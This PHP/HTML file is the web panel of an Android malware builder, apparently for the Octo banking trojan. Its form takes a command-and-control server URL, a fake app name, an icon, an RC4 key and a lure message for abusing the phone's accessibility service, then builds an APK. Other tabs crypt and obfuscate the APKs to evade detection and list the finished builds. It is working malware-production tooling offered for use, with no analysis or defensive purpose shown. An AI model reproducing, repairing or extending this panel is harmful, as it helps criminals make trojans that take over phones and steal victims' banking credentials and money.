<?php 
$kul[0]['username']="admin"; 
$kul[0]['password']="..passbuilder.."; 


function authenticate() 
{ 
header( 'WWW-Authenticate: Basic realm="LOGIN | System Authorized Login"' ); 
header( 'HTTP/1.0 401 Unauthorized' ); 
exit; 
} 

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) { authenticate(); } else 
{ 
for($i=0;$i<count($kul);$i++) { if($_SERVER['PHP_AUTH_USER']==$kul[$i]['username'] && $_SERVER['PHP_AUTH_PW']==$kul[$i]['password']){$auth=TRUE;}} 
if($auth !=TRUE) {authenticate();} 
} 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>bilder</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
        }

        header {
            background-color: #333;
            color: #fff;
            padding: 15px;
            text-align: center;
        }

        nav {
            display: flex;
            justify-content: center;
            background-color: #555;
            padding: 10px;
        }

        nav a {
            color: #fff;
            text-decoration: none;
            padding: 10px 20px;
            margin: 0 10px;
            border-radius: 5px;
            background-color: #777;
            transition: background-color 0.3s ease;
        }

        nav a:hover {
            background-color: #999;
        }

        .tab-content {
            display: none;
            padding: 20px;
            background-color: #fff;
            margin: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        #builder {
            display: block;
        }

        label {
            display: block;
            margin-top: 10px;
        }

        input, button {
            margin-top: 5px;
        }

        button {
            background-color: #333;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #555;
        }
		
.tab-content {
    display: none;
    padding: 20px;
    background-color: #fff;
    margin: 20px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
}

label {
    display: block;
    margin-top: 10px;
    text-align: center; 
}

    </style>
</head>
<body>

<header>
    <li style="width: 100%"><a href="index.php" style="display: inline"><img src="rc/octopus.png" style="float: center; width: 60px; margin: 0 auto; margin-top: 5px;" onmouseover="this.src='rc/octopus_yellow.png'" onmouseout="this.src='rc/octopus.png'" alt="OCTO" title="Octo" /></a></li>
</header>

<nav>
    <a href="#builder" onclick="showTab('builder')">Builder</a>
    <a href="#obsufapk" onclick="showTab('obsufapk')">ObsufAPK(Closed)</a>
    <a href="#listapk" onclick="showTab('listapk')">ListAPK</a>	
</nav>

<!-- Вкладки с содержимым -->

    <div id="builder" class="tab-content">
	  <form action="script.php" method="post" enctype="multipart/form-data">
        <h2>Builder</h2>
        <label for="urlirc">IRC-Server (example; https://octo.com/panel):</label>
        <input type="text" name="urlirc" id="urlirc" required>

        <label for="nameapps">NameApp:</label>
        <input type="text" name="nameapps" id="nameapps" required>
		
		<label for="tag">Tag:</label>
        <input type="text" name="tag" id="tag" required>

        <label for="eresmsg">Msg AccessibilityService:</label>
        <input type="text" name="eresmsg" id="eresmsg" required>
		
		<label for="nameaccesibilityserv">Name AccessibilityService:</label>
        <input type="text" name="nameaccesibilityserv" id="nameaccesibilityserv" required>

        <label for="keyrcencypt">KeyRC4:</label>
        <input type="text" name="keyrcencypt" id="keyrcencypt" required>
		
		<label for="apkname">APKName (example; 33223):</label>
        <input type="text" name="apkname" id="apkname" required>

        <label for="appIcon">Icon (PNG):</label>
        <input type="file" name="appIcon" id="appIcon" accept=".png" required>
        
        <button type="submit">Build APK</button>
    </div>
</form>

<div id="crypto" class="tab-content">
  <form action="cryptapk.php" method="post" enctype="multipart/form-data">
    <h2>CryptAPK</h2>
        <label for="apkcrypt">APK Crpyt:</label>
        <input type="file" name="apkcrypt" id="apkcrypt" accept=".apk" required>

        <button type="submit">APK Crypt</button>
</div>

<div id="obsufapk" class="tab-content">
  <form action="obsufapk.php" method="post" enctype="multipart/form-data">
    <h2>ObsufAPK</h2>
        <label for="apkobsuf">APK:</label>
        <input type="file" name="apkobsuf" id="apkobsuf" accept=".apk" required>

        <button type="submit">APK Obsuf</button>
</div>

<div id="help" class="tab-content">
    <h2>Help</h2>
    <!-- ... ваше содержимое ... -->
</div>

<div id="listapk" class="tab-content">
    <h2>Builded</h2>
        <ul>
            <?php
                $apkFiles = glob("apkbackup/*.apk");
                foreach ($apkFiles as $apkFile) {
                    $apkFileName = basename($apkFile);
                    echo "<li>";
                    echo "<input type='checkbox' name='selectedApks[]' value='$apkFileName'>";
                    echo "<a href=\"$apkFile\">$apkFileName</a>";
                    echo "</li>";
                }
            ?>
        </ul>		
    <h2>Obsuf</h2>		
        <u2>		
            <?php
                $apkFiles = glob("apkobsuf/*.apk");
                foreach ($apkFiles as $apkFile) {
                    $apkFileName = basename($apkFile);
                    echo "<li>";
                    echo "<input type='checkbox' name='selectedApks[]' value='$apkFileName'>";
                    echo "<a href=\"$apkFile\">$apkFileName</a>";
                    echo "</li>";
                }
            ?>
        </u2>	
<!--    <h2>Crypted</h2>		
        <u3>
            <?php
                $apkFiles = glob("apkcrypted/*.apk");
                foreach ($apkFiles as $apkFile) {
                    $apkFileName = basename($apkFile);
                    echo "<li>";
                    echo "<input type='checkbox' name='selectedApks[]' value='$apkFileName'>";
                    echo "<a href=\"$apkFile\">$apkFileName</a>";
                    echo "</li>";
                }
            ?>
        </u3>	-->		
</div>

<script>
    function showTab(tabName) {
        var tabs = document.getElementsByClassName('tab-content');
        for (var i = 0; i < tabs.length; i++) {
            tabs[i].style.display = 'none';
        }
        document.getElementById(tabName).style.display = 'block';
    }
</script>

</body>
</html>
